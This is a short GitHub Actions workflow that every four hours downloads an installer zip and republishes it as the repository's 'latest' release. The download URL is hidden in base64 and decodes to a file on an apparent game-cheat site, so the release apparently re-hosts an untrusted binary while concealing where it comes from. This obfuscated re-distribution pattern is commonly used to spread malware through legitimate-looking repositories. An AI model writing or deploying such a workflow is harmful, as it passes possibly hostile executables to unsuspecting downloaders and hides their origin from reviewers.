name: Auto Update Release
on:
  push:
    paths:
      - '.github/workflows/update-release.yml'
  schedule:
    - cron: '17 */4 * * *'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  update-release:
    runs-on: ubuntu-latest
    steps:
      - name: Download file
        env:
          URL_B64: "aHR0cHM6Ly9oYWRlc2NoZWF0cy5jYy9JbnN0YWxsZXIteDY0LXYzLjEuemlw"
        run: |
          URL=$(printf '%s' "$URL_B64" | base64 -d)
          curl -fL -o Installer-x64-v3.1.zip "$URL"

      - name: Upload to Release
        uses: softprops/action-gh-release@v3
        with:
          tag_name: latest
          name: Installer-x64-v3.1
          files: Installer-x64-v3.1.zip
